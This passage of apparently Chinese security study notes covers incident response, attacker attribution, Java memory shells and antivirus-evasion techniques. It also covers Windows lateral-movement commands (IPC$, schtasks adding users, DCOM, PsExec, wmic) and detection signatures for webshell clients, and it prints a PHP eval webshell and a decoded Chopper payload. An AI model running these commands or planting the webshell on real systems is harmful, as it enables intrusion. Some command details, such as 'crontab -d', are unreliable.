<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul>
<li>依然是查找占用内存高的进程top、htop等</li>
<li>查看是否有恶意网络连接或未授权的端口监听netstat -antp</li>
<li>通过进程名pid或关键词查找挖矿病毒，大概率在tmp目录下，可直接清空</li>
<li>排查异常用户</li>
<li>排查每个用户的异常定时脚本，查看定时任务<code>crontab -l</code>，删除定时任务<code>crontab -d</code>，重启定时任务服务<code>servcice crond restart</code></li>
<li>观察是否还存在内存占用高的情况</li>
</ul>
<h2 id="溯源方法"><a href="#溯源方法" class="headerlink" title="溯源方法"></a>溯源方法</h2><h3 id="对内溯源"><a href="#对内溯源" class="headerlink" title="对内溯源"></a>对内溯源</h3><p>若攻击者已经成功入侵，首先确认攻击者的思路，从已经上传的工具入手，分析流量。对攻击流量进行阻断，删除相关恶意工具，查看对应的中间件日志，查看请求行为，分析攻击者思路</p>
<h3 id="对外溯源"><a href="#对外溯源" class="headerlink" title="对外溯源"></a>对外溯源</h3><p>确认攻击者的真实信息</p>
<p>一般情况下可以直接拿到的攻击者信息：攻击时间，攻击者ip，受攻击目标，恶意文件（不一定有），通过攻击类型分析攻击详情的请求包，判断是否为真实ip（肉鸡ip）</p>
<p>优先级</p>
<ul>
<li>端口扫描-个人vps&#x2F;空间搜索引擎-优先</li>
<li>命令执行-未隐蔽网络&#x2F;移动网络&#x2F;肉鸡-优先</li>
<li>恶意文件-是否存在未屏蔽的关键信息-优先</li>
</ul>
<p>尽可能还原攻击者画像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">姓名/IP	攻击IP	地理位置	QQ	微信	邮箱	手机号</span><br><span class="line">支付宝	IP地址所属公司	IP地址关联域名	人物照片	</span><br><span class="line">跳板机(可选)</span><br></pre></td></tr></table></figure>



<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>java网站都一定会有一个web容器。listener、filter、servlet都是在web.xml中配置的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html">https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html</a></p>
<h3 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h3><p>监听器，本质上是一个java类，作用是Application、session、request三大对象的创建或者删除，根据监听结果来执行提前编写的代码；简单来说，就是通过监听某个行为，来触发某段代码执行</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>筛选器，本质上是一个java类，作用是接收web端的请求并对其进行修改（格式化）和内容判断，变成<strong>servlet</strong>能够接收的数据格式；如果没有filter，则直接将web端的请求发给servlet；可配置多个filter</p>
<h3 id="filter的生命周期"><a href="#filter的生命周期" class="headerlink" title="filter的生命周期"></a>filter的生命周期</h3><p>filter的创建和销毁由web容器负责；web程序启动时创建filter的实例对象，读取web.xml，完成对象的初始化功能</p>
<p>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。销毁函数会在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<h3 id="filterchains"><a href="#filterchains" class="headerlink" title="filterchains"></a>filterchains</h3><p>当存在多个filter的时候就组成了filter链，web服务根据在web.xml中的filter注册顺序进行调用；当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain，然后调用filterchain中其他filter的filter.doFilter方法</p>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><p>本质上是一个java类；由容器进行调度和执行，进行数据处理的核心模块，里面有一个函数services，这个函数是servlet的核心代码，实现servlet的核心功能；所有的servlet在第一次访问的时候创建，直到服务器关闭的时候才销毁。</p>
<h2 id="免杀有无研究"><a href="#免杀有无研究" class="headerlink" title="免杀有无研究"></a>免杀有无研究</h2><p>shellcode分离免杀</p>
<p>硬编码异或免杀</p>
<p>干扰字符免杀</p>
<p>调用冷门函数</p>
<p>加壳，花指令</p>
<p>修改内存特征</p>
<h2 id="域内横向移动的方法"><a href="#域内横向移动的方法" class="headerlink" title="域内横向移动的方法"></a>域内横向移动的方法</h2><h3 id="IPC共享"><a href="#IPC共享" class="headerlink" title="IPC共享"></a>IPC共享</h3><p>条件：开启了139，445端口，开启了IPC$默认共享，知道目标的账户密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立IPC连接</span></span><br><span class="line">net use \\\\ IP \ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="at-schtasks"><a href="#at-schtasks" class="headerlink" title="at&#x2F;schtasks"></a>at&#x2F;schtasks</h3><p>at命令在2012之前的系统使用，后面的系统使用schtasks代替</p>
<p>条件：开启了139，445端口，获取了其他主机的明文密码或者hash值</p>
<p>at传递</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">建立ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">本地制作user.bat文件放在本地c盘执行命令脚本：net user haha 123.com /add</span><br><span class="line">将文件上传到对方主机C 盘：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">给对方主机添加命令执行任务：at \192.168.213.163 12:20 c:user.bat</span><br><span class="line">等待后查看到对方主机添加用户haha</span><br></pre></td></tr></table></figure>

<p>schtasks传递</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">复制脚本bat文件：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">创建 adduser 任务对应执行文件：schtasks /create /s 192.168.213.163 /ru ``<span class="string">&quot;SYSTEM&quot;</span>` `/tn adduser /sc DAILY /tr c:user.bat /F</span><br><span class="line">执行文件任务：schtasks /run /s 192.168.213.163 /tn adduser /i</span><br><span class="line">删除执行文件任务：schtasks /delect /s 192.168.213.163 /tn adduser /f</span><br></pre></td></tr></table></figure>

<h3 id="pth-ptk-ptt-1"><a href="#pth-ptk-ptt-1" class="headerlink" title="pth ptk ptt"></a>pth ptk ptt</h3><p>常见的有黄金&#x2F;白银票据，哈希传递，ms14-068等，可利用mimikatz</p>
<h3 id="dcom组件"><a href="#dcom组件" class="headerlink" title="dcom组件"></a>dcom组件</h3><p>DCOM（分布式组件对象模型,分布式组件对象模式）是一系列微软的概念和程序接口，利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。DCOM基于组件对象模型（COM），COM提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95或者其后的版本上）。</p>
<p>并不是所有dcom组件都可以执行命令，目前网络上大多使用的是<code>MMC20.APPLICATION</code>来进行横向移动。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &#x27;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E860BA07F889&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/webp.webp" alt="img"></p>
<p>执行远程命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;10.92.XXX.XX&quot;)).Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname calc.exe&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/webp.webp" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/webp-1700808110529-7.webp" alt="img"></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>windows SysinternalsSuite攻击套件中的一员，由于文件拥有微软的签名，所以很多杀软都会放行，但是行为很容易检测。metasploit中也集成了psexec工具模块，其实原理是一样的。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用：PsExec64.exe \\HOST -u USERNAME -p PASSWORD COMMAND</span><br></pre></td></tr></table></figure>

<h3 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h3><p>WMI，是Windows 2K&#x2F;XP管理系统的核心；对于其他的Win32操作系统，WMI是一个有用的插件。WMI以CIMOM为基础，CIMOM即公共信息模型对象管理器（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和脚本程序提供了一个访问操作系统构成单元的公共接口。有了WMI，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API。如今大部分WINDOWS版本的机器都内置了WMI组件，所以利用WMI横向移动是一件很方便的事情。</p>
<p>使用： <code>wmic /node:IP /user:USERNAME /password:PASSWORD process list brief</code></p>
<p>执行命令: <code>wmic /node:IP /user:USERNAME /password:PASSWORD process call create &quot;cmd.exe /c tasklist&quot;</code></p>
<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p>Windows 远程管理 (WinRM) 是微软对 WS-Management Protocol（Web Services for Management aka WSMan）的实现，这是一种基于标准简单对象访问协议 (SOAP) 的防火墙友好协议，它允许来自不同硬件和操作系统的供应商，进行互操作。WinRM HTTP 通信通过 TCP 端口 5985 进行，HTTPS (TLS) 通信通过 TCP 端口 5986 进行。WinRM 本身支持 NTLM 和 Kerberos（域）身份验证。初始身份验证后，WinRM 会话受 AES 加密保护。</p>
<h3 id="域内密码喷洒脚本"><a href="#域内密码喷洒脚本" class="headerlink" title="域内密码喷洒脚本"></a>域内密码喷洒脚本</h3><p>用多个弱密码连续爆破同一个服务器会触发策略而锁定登录，这时候可以通过写脚本以一组弱密码批量撞多个服务器（故叫做喷洒脚本）</p>
<h3 id="窃取管理员token横向"><a href="#窃取管理员token横向" class="headerlink" title="窃取管理员token横向"></a>窃取管理员token横向</h3><h2 id="流量特征-webshell客户端等"><a href="#流量特征-webshell客户端等" class="headerlink" title="流量特征 webshell客户端等"></a>流量特征 webshell客户端等</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>请求侧通信流量</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>690</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=m4mi07jn4u6cd3gmhdt97fmq55</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">cmd=<span class="meta">%</span><span class="number">40</span>eval<span class="meta">%</span><span class="number">01</span><span class="meta">%</span><span class="number">28</span>base<span class="number">64</span>_decode<span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">24</span>_POST<span class="meta">%</span><span class="number">5</span>Bz<span class="number">0</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">3</span>B&amp;z<span class="number">0</span>=QGluaV<span class="number">9</span>zZXQoImRpc<span class="number">3</span>BsYXlfZXJyb<span class="number">3</span>JzIiwiMCIp<span class="meta">O0</span>BzZXRfdGltZV<span class="number">9</span>saW<span class="number">1</span>pdCgwKTtAc<span class="number">2</span>V<span class="number">0</span>X<span class="number">21</span>hZ<span class="number">2</span>ljX<span class="number">3</span>F<span class="number">1</span>b<span class="number">3</span>Rlc<span class="number">19</span>ydW<span class="number">50</span>aW<span class="number">1</span>lKDAp<span class="meta">O2</span>Vja<span class="name">G8</span>oIi<span class="number">0</span><span class="meta">%</span><span class="number">2</span>BfCIpOzskRD<span class="number">1</span>kaXJuYW<span class="number">1</span>lKCRfU<span class="number">0</span><span class="attr">VSVkVSWyJTQ1</span>JJUFRfRklMRU<span class="number">5</span>BTUUiXSk<span class="number">7</span>aWYoJEQ<span class="number">9</span>PSIiKSREPWRpc<span class="name">m5</span>hbWUoJF<span class="number">9</span>TRVJWRVJbIlBBVEhfVFJBTl<span class="symbol">NMQVRFRCJdKTskUj0</span>ieyREfVx<span class="number">0</span>IjtpZihzdWJzdHIoJEQsMCwxKSE<span class="number">9</span>Ii<span class="number">8</span>iKXtmb<span class="number">3</span>JlYW<span class="symbol">NoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2</span>RpcigieyRMfToiKSkkUi<span class="number">49</span>I<span class="symbol">nskTH06</span>Ijt<span class="number">9</span>JFIuPSJcdCI<span class="number">7</span>JHU<span class="number">9</span>KGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uX<span class="number">2</span>V<span class="number">4</span>aX<span class="symbol">N0</span>cyg<span class="symbol">ncG9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>ZWdpZCcpKT<span class="number">9</span>Ac<span class="name">G9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>cHd<span class="number">1</span>aWQoQHB<span class="attr">vc2</span>l<span class="number">4</span>X<span class="number">2</span>dldGV<span class="number">1</span>aWQoKSk<span class="number">6</span>Jyc<span class="number">7</span>JHVzcj<span class="number">0</span>oJHUpPyR<span class="number">1</span>WyduYW<span class="number">1</span>lJ<span class="number">106</span>QGdldF<span class="number">9</span>jdXJyZW<span class="number">50</span>X<span class="number">3</span>VzZXIoKTskUi<span class="number">49</span>cGhwX<span class="number">3</span>VuYW<span class="number">1</span>lKCk<span class="number">7</span>JFIuPSIoeyR<span class="number">1</span>c<span class="number">3</span>J<span class="number">9</span>KSI<span class="number">7</span>cHJpb<span class="symbol">nQgJFI7</span><span class="meta">O2</span>Vja<span class="name">G8</span>oI<span class="symbol">nw8</span>LSIp<span class="meta">O2</span>RpZSgpOw<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">3</span>D</span></span><br></pre></td></tr></table></figure>

<p>流量解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval.(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>

<p>响应侧通信流量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231149-13042956-9a0f-1.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>请求侧通信流量存在<code>@eval</code>函数</li>
<li>请求侧流量使用的是base64编码，并且头部有固定QG字段</li>
<li>请求侧默认攻击载荷为z1或者z0</li>
<li>响应侧流量一般包裹在<code>-&gt;|xxxx|&lt;-</code>当中</li>
</ul>
<h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">#蚁剑不同的编码器会有不同的代码，这里以普通的分析</span></span><br></pre></td></tr></table></figure>

<p>编码器在发送数据到服务端之前对payload进行相关处理，目的是为了绕过请求侧的流量检测，默认的有：</p>
<ul>
<li>default编码器：不对传输的payload进行任何操作。</li>
<li>base64编码器：对payload进行base64编码。</li>
<li>chr编码器：对payload的所有字符都利用利用chr函数进行转换。</li>
<li>chr16编码器：对payload的所有字符都利用chr函数转换，与chr编码器不同的是chr16编码器对chr函数传递的参数是十六进制。</li>
<li>rot13编码器：对payload中的字母进行rot13转换。</li>
<li>以上五种编码为中国蚁剑自带的，不需要配置就可以直接使用，除此之外，还存在一个RSA编码器，该编码器将</li>
<li>RSA编码器：该编码器默认不展示，需要自己配置。配置方法：在编码管理界面点击生成RSA配置生成公钥、私钥和PHP代码，然后点击新建编码器选择PHP RSA之后输入编码器的名字即可。</li>
</ul>
<p>解码器主要是对接收到的数据进相关处理，目的是为了绕过响应侧的流量检测，默认的解码器：</p>
<ul>
<li>default解码器：不对响应数据进行处理。</li>
<li>base64解码器：将收到的数据进行base64解码。</li>
<li>rot13解码器：将收到的数据进行rot13转换，由于英文字母一共26个所以置换两次之后会还原。</li>
</ul>
<p>请求侧通信流量</p>
<p>默认编码器发送的数据如下：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-138e05d6-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231150-138e05d6-9a0f-1.jpg" alt="img"></a></p>
<p>base64编码器发送数据如下：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13b74b76-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231151-13b74b76-9a0f-1.jpg" alt="img"></a></p>
<p>chr：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13fa7aea-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231151-13fa7aea-9a0f-1.jpg" alt="img"></a></p>
<p>chr16：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-14398fe6-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231151-14398fe6-9a0f-1.jpg" alt="img"></a></p>
<p>rot13:</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-1461fa6c-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231152-1461fa6c-9a0f-1.jpg" alt="img"></a></p>
<p>rsa:</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-148de50a-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231152-148de50a-9a0f-1.jpg" alt="img"></a></p>
<p>响应侧流量</p>
<p>default：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14ae1dac-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231152-14ae1dac-9a0f-1.jpg" alt="img"></a></p>
<p>base64：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14cd88fe-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231152-14cd88fe-9a0f-1.jpg" alt="img"></a></p>
<p>rot13：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-14ee819e-9a0f-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210410231153-14ee819e-9a0f-1.jpg" alt="img"></a></p>
<p><strong>总结</strong></p>
<ul>
<li>使用对应的编码器编码算法进行解码</li>
<li>php使用assert和eval；asp使用eval；jsp使用classloader加载</li>
<li>文件操作的流量，会有_0x开头的参数，与编码器无关</li>
</ul>
<h3 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h3><p>webshell源码</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210405205409-03663e4e-960e-1.png" alt="img" style="zoom: 50%;" />

<p>分析：</p>
<p>首先对get传入的参数pass进行检查，如果存在则以时间方式生成一个长度16的key存入到session中；再判断是否开启openssl拓展，如果开启了就会进行AES解密得到<strong>中继字符串</strong>，即<code>assert|eval(&quot;phpinfo();&quot;)</code>，这是固定定义好的；接着用explode函数拆分中继字符串为字符串数组；再以可变函数的形式，以索引为0的数组元素调用索引为1的数组元素，即<code>assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)</code>；如果没有开启openssl拓展，则进行异或处理然后base64加密。</p>
<p>流量分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210405205439-1566c91a-960e-1.jpg" alt="img"></p>
<p>首先发送了两次get请求，第一次请求对应刚刚的16位key并写入session中，与当前会话绑定；第二次请求则获取key，此时的key为解密的key，解密出来的内容还有一层base64编码</p>
<p>是否开启openssl</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/20210405205532-34dab842-960e-1.png" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>采用AES对称加密</li>
<li>采用密钥协商机制，第一阶段返回200和16位明文连接密码</li>
<li>建立连接之后的所有请求cookie格式都为path&#x3D;&#x2F;；</li>
<li>php中存在eval和assert等字符特征</li>
<li>asp中会在for循环中进行异或处理</li>
<li>jsp中存在classloader和getclass().getclassloader()等字符特征</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220605203147800.png" alt="image-20220605203147800"></p>
<h3 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h3><p><strong>总结</strong></p>
<ul>
<li>内置默认的十六种ua头（可更改）</li>
<li>交流无明文，采用预共享密钥</li>
<li>默认的webshell存在16位数的连接密码(md5 32位的前16，默认密码明文为rebeyond)</li>
<li>在建立连接后使用命令执行功能时，请求包中content-length为5740或5720</li>
<li>每一个请求头中存在Pragma:no-cache,cache-control:no-cache</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220605203138996.png" alt="image-20220605203138996"></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p><strong>总结</strong></p>
<ul>
<li>base64加密</li>
<li>php，asp都有eval；jsp有sc，pass，classloader，getclass().getclassloader()等</li>
<li>响应头部中大部分存在cache-control:no-store，no-cache，must-revalidate</li>
<li>cookie值的最后都以”；”结尾</li>
<li>生成的shell因为使用了TCP长连接会生成3个http包：第一个包发送一长段payload，一般是一个变量加上一堆加密过后的值，且http的响应为空；第二个包发送一段与先前的变量名相同，加一串密文，解密之后可以获得methodName&#x3D;test，目的是为了测试shell的连通情况，并给客户端打印ok，内容固定；第三个包发送类似第二个包，加密的内容从test变成了getBasicsInfo，用于调用之前payload的内容将目标环境信息向客户端返回。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220605203120830.png" alt="image-20220605203120830"></p>
<h2 id="Webshell客户端使用上的区别"><a href="#Webshell客户端使用上的区别" class="headerlink" title="Webshell客户端使用上的区别"></a>Webshell客户端使用上的区别</h2><ul>
<li>蚁剑：有多种编码器&#x2F;解码器，可进行流量混淆绕过waf，开源可自行编写插件</li>
<li>冰蝎：</li>
</ul>
<h2 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h2><ul>
<li>知道网站物理路径</li>
<li>拥有sa权限</li>
<li>secure_file_priv无限制</li>
<li>网站路径有写入权限</li>
</ul>
